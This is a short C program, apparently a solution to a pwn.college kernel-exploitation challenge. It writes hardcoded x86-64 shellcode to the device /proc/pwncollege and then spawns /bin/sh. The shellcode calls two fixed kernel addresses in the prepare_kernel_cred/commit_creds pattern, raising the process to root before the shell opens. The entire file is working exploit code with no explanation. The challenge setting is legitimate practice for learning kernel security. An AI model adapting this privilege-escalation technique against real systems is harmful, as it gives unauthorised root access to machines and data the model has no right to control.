#include <fcntl.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = "\x48\x31\xff\x49\xc7\xc1\x60\x96\x08\x81\x41\xff\xd1\x48"
                   "\x89\xc7\x49\xc7\xc1\x10\x93\x08\x81\x41\xff\xd1\xc3";

int main() {
  int fd = open("/proc/pwncollege", O_RDWR);

  write(fd, shellcode, strlen(shellcode));
  execl("/bin/sh", "/bin/sh", 0);

  return 0;
}
